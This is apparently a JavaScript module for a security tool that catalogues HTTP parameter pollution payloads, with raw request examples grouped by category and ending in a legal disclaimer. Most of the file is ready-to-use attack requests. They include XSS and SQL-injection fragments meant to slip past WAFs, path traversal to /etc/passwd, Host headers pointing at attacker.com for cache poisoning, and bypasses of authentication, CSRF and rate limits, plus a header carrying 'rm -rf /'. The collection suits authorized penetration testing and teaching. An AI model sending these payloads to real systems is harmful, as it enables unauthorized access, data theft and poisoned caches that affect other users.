export const HTTP_PARAMETER_POLLUTION_CATEGORIES = {
  GET_POLLUTION: 'GET Parameter Pollution',
  POST_POLLUTION: 'POST Parameter Pollution',
  COOKIE_POLLUTION: 'Cookie Pollution',
  HEADER_INJECTION: 'HTTP Header Injection',
  PARSING_CONFUSION: 'Backend Parsing Confusion',
  WAF_BYPASS: 'WAF Bypass Techniques',
  CACHE_POISONING: 'Cache Poisoning',
  FILTER_EVASION: 'Input Filter Evasion'
};

const payloads = {
  GET_POLLUTION: [
    {
      name: 'Basic GET Parameter Duplication',
      description: 'Duplicate URL parameters to test backend handling',
      payload: `GET /search?query=safe&query=<script>alert(1)</script> HTTP/1.1
Host: example.com`,
      explanation: 'Different backends handle duplicate parameters differently. Some take first value, some take last, some concatenate. This can bypass filters.'
    },
    {
      name: 'GET Parameter Array Injection',
      description: 'Use array notation to inject multiple values',
      payload: `GET /filter?id=1&id=2&id=3&id=999 HTTP/1.1
Host: example.com

Query string: ?id[]=1&id[]=2&id[]=admin`,
      explanation: 'Some backends interpret id[] as array parameter. Can be used to access multiple records or escalate privileges.'
    },
    {
      name: 'GET Parameter Precedence Testing',
      description: 'Test which duplicate parameter is processed',
      payload: `GET /api/user?user_id=1&user_id=2&user_id=PAYLOAD HTTP/1.1
Host: example.com`,
      explanation: 'Insert payload in third duplicate parameter to test which one backend processes. Results show parameter precedence.'
    },
    {
      name: 'GET Encoding Pollution',
      description: 'Mix encoded and unencoded duplicate parameters',
      payload: `GET /page?filter=admin&filter=%61%64%6d%69%6e&filter=%2e%2e%2fadmin HTTP/1.1
Host: example.com`,
      explanation: 'Different encoding levels can bypass filter rules. Some backends decode multiple times, others inconsistently.'
    },
    {
      name: 'GET Parameter Null Byte Injection',
      description: 'Inject null bytes to truncate parameter handling',
      payload: `GET /download?file=document.pdf%00.txt HTTP/1.1
Host: example.com`,
      explanation: 'Null byte causes string termination in some languages. Bypasses extension checks or file type validation.'
    }
  ],

  POST_POLLUTION: [
    {
      name: 'Basic POST Parameter Duplication',
      description: 'Duplicate POST parameters in request body',
      payload: `POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

username=admin&username=victim&password=test&password=wrong`,
      explanation: 'POST parameter duplication can cause different backend systems to process different values, allowing bypass of authentication.'
    },
    {
      name: 'Mixed GET/POST Parameter Pollution',
      description: 'Duplicate parameters across both GET and POST',
      payload: `POST /api/update?id=1&id=999 HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

id=2&action=delete&action=view`,
      explanation: 'Some backends merge GET and POST parameters. Can cause conflicting values that confuse backend logic.'
    },
    {
      name: 'POST Parameter Repetition Attack',
      description: 'Repeat same parameter many times to exploit buffer handling',
      payload: `POST /api/validate HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=test@evil.com&email=test@evil.com&email=test@evil.com&...
[repeat 1000 times]`,
      explanation: 'Forces backend to handle repetition. May cause crashes, memory issues, or bypass validation logic.'
    },
    {
      name: 'POST Form-Data Pollution',
      description: 'Duplicate parameters in multipart form data',
      payload: `POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="user_role"

user
------Boundary
Content-Disposition: form-data; name="user_role"

admin
------Boundary--`,
      explanation: 'Multipart form handling differs between backends. Can override expected values with duplicate field names.'
    },
    {
      name: 'POST Parameter Override',
      description: 'Place legitimate parameter before malicious duplicate',
      payload: `POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=john_doe&username=admin&is_premium=false&is_premium=true&balance=100&balance=999999`,
      explanation: 'First parameter passes security checks, second overrides backend logic depending on processing order.'
    }
  ],

  COOKIE_POLLUTION: [
    {
      name: 'Basic Cookie Duplication',
      description: 'Send duplicate cookies with different values',
      payload: `GET / HTTP/1.1
Host: example.com
Cookie: user_id=1; user_id=999; session_id=abc; session_id=def`,
      explanation: 'Different backend frameworks prioritize cookies differently. Can override authentication or session tokens.'
    },
    {
      name: 'Cookie Name Variation',
      description: 'Use similar cookie names to confuse backend',
      payload: `GET / HTTP/1.1
Host: example.com
Cookie: admin=false; Admin=true; ADMIN=yes; admin_flag=1`,
      explanation: 'Case sensitivity and naming variation can confuse cookie parsing. May lead to privilege escalation.'
    },
    {
      name: 'Session Cookie Override',
      description: 'Attempt to override session with privilege escalation',
      payload: `GET /admin HTTP/1.1
Host: example.com
Cookie: session_token=VALID_USER_TOKEN; session_token=CRAFTED_ADMIN_TOKEN; user_role=admin; user_role=superadmin`,
      explanation: 'Sending multiple session values tests if backend properly validates cookie hierarchy and precedence.'
    },
    {
      name: 'Cookie Path Pollution',
      description: 'Inject path traversal in cookie values',
      payload: `GET / HTTP/1.1
Host: example.com
Cookie: redirect=/safe; redirect=../admin; callback=/home; callback=../../sensitive`,
      explanation: 'Cookie values containing paths can be exploited to redirect to unintended locations or access restricted areas.'
    }
  ],

  HEADER_INJECTION: [
    {
      name: 'Host Header Pollution',
      description: 'Inject multiple Host headers for cache poisoning',
      payload: `GET / HTTP/1.1
Host: example.com
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Original-Host: attacker.com`,
      explanation: 'Different systems may process different host headers. Can poison caches or bypass host-based access controls.'
    },
    {
      name: 'Content-Type Header Pollution',
      description: 'Send conflicting Content-Type headers',
      payload: `POST /api HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded

{"payload": "json"}&payload=form`,
      explanation: 'Backend may interpret body based on last Content-Type header, bypassing JSON/form validation.'
    },
    {
      name: 'Authorization Header Duplication',
      description: 'Duplicate authorization headers with different values',
      payload: `GET /api/admin HTTP/1.1
Host: example.com
Authorization: Bearer VALID_TOKEN
Authorization: Bearer INVALID_TOKEN
X-API-Key: key1
X-API-Key: ATTACKER_KEY`,
      explanation: 'Proxy or load balancer may process first auth, application may process second. Can bypass authentication.'
    },
    {
      name: 'X-Forwarded-For Pollution',
      description: 'Multiple X-Forwarded-For headers for IP bypass',
      payload: `GET /admin HTTP/1.1
Host: example.com
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Client-IP: 127.0.0.1`,
      explanation: 'WAF or IP whitelist may take first header, application may take last. Can bypass IP-based restrictions.'
    },
    {
      name: 'User-Agent Injection',
      description: 'Inject malicious User-Agent with formatting attacks',
      payload: `GET / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0; DROP TABLE users; --
User-Agent: <script>alert(1)</script>
X-Scanner: nmap; rm -rf /`,
      explanation: 'User-Agent may be logged or displayed without proper escaping. Can lead to XSS or injection attacks.'
    }
  ],

  PARSING_CONFUSION: [
    {
      name: 'Parameter Parsing Difference (IIS vs Apache)',
      description: 'Exploit different parameter parsing between servers',
      payload: `GET /download?file=document.pdf;backup=../../etc/passwd HTTP/1.1
Host: example.com`,
      explanation: 'IIS treats semicolon as parameter separator, Apache ignores it. Can bypass path traversal filters on IIS.'
    },
    {
      name: 'Parameter Delimiter Confusion',
      description: 'Mix different parameter delimiters',
      payload: `GET /api?param1=value1&param2=value2;param3=PAYLOAD:param4=test HTTP/1.1
Host: example.com`,
      explanation: 'Some backends accept both & and ; as delimiters. Can inject extra parameters to override values.'
    },
    {
      name: 'Case Sensitivity Confusion',
      description: 'Use mixed case in parameter names',
      payload: `GET /admin?ID=1&Id=2&iD=PAYLOAD&id=999 HTTP/1.1
Host: example.com`,
      explanation: 'Case-insensitive parameters may be processed multiple times by different backend components.'
    },
    {
      name: 'Whitespace Character Injection',
      description: 'Use different whitespace characters in parsing',
      payload: `GET /admin?user%20id=1&user%09id=2&user%0aid=ADMIN HTTP/1.1
Host: example.com`,
      explanation: 'Tab (%09) and newline (%0a) can bypass parameter parsing in some frameworks.'
    },
    {
      name: 'Parameter Fragment Interpretation',
      description: 'Place payload in URL fragment for different processing',
      payload: `GET /page#param=value&admin=true HTTP/1.1
Host: example.com`,
      explanation: 'Server vs client handling of fragments. Server doesn\'t see fragments, but JavaScript may process them differently.'
    }
  ],

  WAF_BYPASS: [
    {
      name: 'Parameter Fragmentation Bypass',
      description: 'Split malicious payload across multiple parameters',
      payload: `GET /search?q=<&q=script&q=>&q=alert&q=(&q=1&q=) HTTP/1.1
Host: example.com`,
      explanation: 'WAF may check individual parameters but not combinations. Fragments reassembled by backend create valid payload.'
    },
    {
      name: 'Encoding Parameter Bypass',
      description: 'Use parameter duplication with different encoding',
      payload: `GET /filter?search=test&search=%3Cscript%3E&search=%2Fscript%3E HTTP/1.1
Host: example.com`,
      explanation: 'WAF may check raw parameters but backend decodes differently. Mixed encoding bypasses filters.'
    },
    {
      name: 'Parameter Name Obfuscation',
      description: 'Use confusing parameter names to bypass WAF rules',
      payload: `GET /api?a=1&b_=2&c__=PAYLOAD&___d=test HTTP/1.1
Host: example.com`,
      explanation: 'WAF whitelist may miss parameters with extra underscores that backend strips during parsing.'
    },
    {
      name: 'Numeric Parameter Bypass',
      description: 'Use numeric parameter duplication for WAF bypass',
      payload: `GET /page?1=safe&1=payload&2=test&2=admin HTTP/1.1
Host: example.com`,
      explanation: 'Some WAF rules don\'t apply to numeric parameter names, allowing payload injection.'
    },
    {
      name: 'Null Parameter Byte Bypass',
      description: 'Inject null bytes to truncate WAF checks',
      payload: `GET /search?q=safe%00&q=<script>alert(1)</script> HTTP/1.1
Host: example.com`,
      explanation: 'WAF may stop processing at null byte while backend processes full value after it.'
    }
  ],

  CACHE_POISONING: [
    {
      name: 'Cache Key Collision',
      description: 'Poison cache with alternative parameter values',
      payload: `GET /api/user?user_id=123&cache_key=collision&attacker_id=456 HTTP/1.1
Host: example.com
Cache-Control: public`,
      explanation: 'Cache may use different keys than backend. Duplicate parameters can collide in cache, serving poisoned content.'
    },
    {
      name: 'UTF-8 Normalization Bypass',
      description: 'Use UTF-8 encoding variations to bypass cache',
      payload: `GET /page?search=café&search=cafe%CC%81 HTTP/1.1
Host: example.com`,
      explanation: 'Different UTF-8 normalization (é vs e + combining mark) creates different cache keys but same value.'
    },
    {
      name: 'Query String Reordering Cache Poison',
      description: 'Reorder parameters to create cache poisoning opportunity',
      payload: `GET /product?id=123&price=9.99 vs /product?price=9.99&id=123 HTTP/1.1
Host: example.com`,
      explanation: 'Cache key may include query string order. Same content served from different parameter order.'
    },
    {
      name: 'Parameter Value Overflow Poisoning',
      description: 'Use excessive parameter values to poison cache',
      payload: `GET /api?data=VERY_LONG_VALUE_REPEATED_MANY_TIMES&data=[repeated 10000 chars] HTTP/1.1
Host: example.com`,
      explanation: 'Large parameter values can cause cache to store different content than intended, affecting other users.'
    }
  ],

  FILTER_EVASION: [
    {
      name: 'Input Validation Duplicate Bypass',
      description: 'Bypass input validation with duplicate parameters',
      payload: `POST /api/user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=blocked@evil.com&email=admin@company.com&action=create&action=delete`,
      explanation: 'Validation may check first parameter, but backend processes last. Can bypass email/domain filters.'
    },
    {
      name: 'XSS Filter Evasion via Pollution',
      description: 'Bypass XSS filters using duplicate parameters',
      payload: `GET /comment?text=normal&text=<img&text= src=x&text= onerror=alert(1)> HTTP/1.1
Host: example.com`,
      explanation: 'XSS filter may check individual parameters but not concatenated result. Fragments bypass detection.'
    },
    {
      name: 'SQL Injection Filter Evasion',
      description: 'Bypass SQL injection filters with parameter duplication',
      payload: `GET /profile?id=1&id=%27 UNION SELECT&id=* FROM users&id=--& HTTP/1.1
Host: example.com`,
      explanation: 'SQL filter may check individual parameters but backend concatenates them into valid SQL injection.'
    },
    {
      name: 'CSRF Token Bypass with Pollution',
      description: 'Override CSRF token with duplicate parameter',
      payload: `POST /action HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

csrf_token=VALID_TOKEN&csrf_token=INVALID_TOKEN&action=delete`,
      explanation: 'CSRF validation may use first token, action processing uses last parameters. Can bypass CSRF checks.'
    },
    {
      name: 'Rate Limiting Bypass via Pollution',
      description: 'Distribute requests across duplicate parameters',
      payload: `GET /api/login?username=user1&username=user2&username=user3&password=test HTTP/1.1
Host: example.com`,
      explanation: 'Rate limiting may count request once, but backend processes three separate operations. Bypasses rate limits.'
    }
  ]
};

export function getAllCategories() {
  return Object.entries(HTTP_PARAMETER_POLLUTION_CATEGORIES).map(([key, label]) => ({
    key,
    label
  }));
}

export function getPayloadsByCategory(categoryKey) {
  const categoryPayloads = payloads[categoryKey];
  return categoryPayloads || [];
}

export function getAllPayloads() {
  const allPayloads = [];
  Object.keys(payloads).forEach(category => {
    allPayloads.push(...payloads[category]);
  });
  return allPayloads;
}

export function searchPayloads(query) {
  const lowerQuery = query.toLowerCase();
  return getAllPayloads().filter(
    payload =>
      payload.name.toLowerCase().includes(lowerQuery) ||
      payload.description.toLowerCase().includes(lowerQuery) ||
      payload.payload.toLowerCase().includes(lowerQuery)
  );
}

export const BACKEND_PARSING_BEHAVIORS = [
  { backend: 'PHP/Apache', behavior: 'Takes last parameter value', example: '?id=1&id=2 → id=2' },
  { backend: 'JSP/Tomcat', behavior: 'Concatenates all values with comma', example: '?id=1&id=2 → id=1,2' },
  { backend: '.NET/IIS', behavior: 'Takes first parameter value', example: '?id=1&id=2 → id=1' },
  { backend: 'Python/Django', behavior: 'Returns list of values', example: '?id=1&id=2 → [1,2]' },
  { backend: 'Node.js/Express', behavior: 'Behavior depends on middleware', example: '?id=1&id=2 → varies' },
  { backend: 'Perl/CGI', behavior: 'Concatenates with \0 separator', example: '?id=1&id=2 → id=1\0id=2' }
];

export const LEGAL_DISCLAIMER = `
⚠️  LEGAL DISCLAIMER
═════════════════════════════════════════════════════════════════════════════

This HTTP Parameter Pollution generator is provided for EDUCATIONAL AND
AUTHORIZED SECURITY TESTING PURPOSES ONLY.

🚨 ILLEGAL USES:
• Unauthorized testing on systems you don't own or have written permission to test
• Bypassing security controls to gain unauthorized access
• Cache poisoning attacks affecting other users
• Denial of Service attacks through parameter pollution
• Using this tool for fraud, data theft, or malicious purposes

⚖️  CONSEQUENCES:
• Criminal prosecution under computer fraud and abuse laws
• Civil liability for damages to systems and affected users
• Imprisonment and substantial fines
• Permanent criminal record affecting employment
• Company liability if used on business systems without authorization

✅ LEGAL USES:
• Authorized penetration testing with written documented permission
• Security research on systems you own or control
• Educational learning in authorized lab environments
• Bug bounty programs with proper scope and authorization
• Responsible vulnerability disclosure through proper channels

By using this tool, you acknowledge:
1. You have explicit written authorization to test any systems
2. You understand the legal consequences of unauthorized access
3. You will not use this for DoS attacks or cache poisoning affecting others
4. You follow responsible disclosure practices
5. You are solely responsible for any illegal use

HTTP Parameter Pollution testing is subject to same laws as other
web application security testing. Unauthorized access is illegal.
`;
